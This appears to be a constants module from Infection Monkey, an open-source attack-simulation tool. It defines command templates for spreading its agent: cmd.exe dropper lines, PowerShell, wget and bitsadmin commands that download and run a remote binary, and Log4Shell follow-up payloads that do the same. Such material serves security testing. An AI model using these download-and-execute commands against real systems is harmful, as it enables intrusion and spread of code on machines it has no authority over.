MONKEY_ARG = "m0nk3y"
DROPPER_ARG = "dr0pp3r"
ID_STRING = "M0NK3Y3XPL0ITABLE"

# Username prefix for users created by Infection Monkey
USERNAME_PREFIX = "somenewuser"

SET_OTP_WINDOWS = "set %(agent_otp_environment_variable)s=%(agent_otp)s&"

# CMD prefix for windows commands
CMD_EXE = "cmd.exe"
CMD_CARRY_OUT = "/c"
CMD_PREFIX = CMD_EXE + " " + CMD_CARRY_OUT
DROPPER_CMDLINE_WINDOWS = "%s %s %%(dropper_path)s %s" % (
    CMD_PREFIX,
    SET_OTP_WINDOWS,
    DROPPER_ARG,
)
MONKEY_CMDLINE_WINDOWS = "%s %s %%(monkey_path)s %s" % (
    CMD_PREFIX,
    SET_OTP_WINDOWS,
    MONKEY_ARG,
)

# Commands used for downloading monkeys
POWERSHELL_HTTP_UPLOAD = (
    "powershell -NoLogo -Command \"Invoke-WebRequest -Uri '%(http_path)s' -OutFile '%("
    "monkey_path)s' -UseBasicParsing\" "
)
WGET_HTTP_UPLOAD = "wget -O %(monkey_path)s %(http_path)s"
BITSADMIN_CMDLINE_HTTP = (
    "bitsadmin /transfer Update /download /priority high %(http_path)s %(monkey_path)s"
)
CHMOD_MONKEY = "chmod +x %(monkey_path)s"
RUN_MONKEY = "%(monkey_path)s %(monkey_type)s %(parameters)s"
# Commands used to check for architecture and if machine is exploitable
CHECK_COMMAND = "echo %s" % ID_STRING

LOG4SHELL_LINUX_COMMAND = (
    "wget -O %(monkey_path)s %(http_path)s ;"
    "chmod +x %(monkey_path)s ;"
    " %(agent_otp_environment_variable)s=%(agent_otp)s "
    " %(monkey_path)s %(monkey_type)s %(parameters)s"
)

LOG4SHELL_WINDOWS_COMMAND = (
    'powershell -NoLogo -Command "'
    "Invoke-WebRequest -Uri '%(http_path)s' -OutFile '%(monkey_path)s' -UseBasicParsing; "
    "$env:%(agent_otp_environment_variable)s='%(agent_otp)s' ; "
    '%(monkey_path)s %(monkey_type)s %(parameters)s"'
)
DOWNLOAD_TIMEOUT = 180
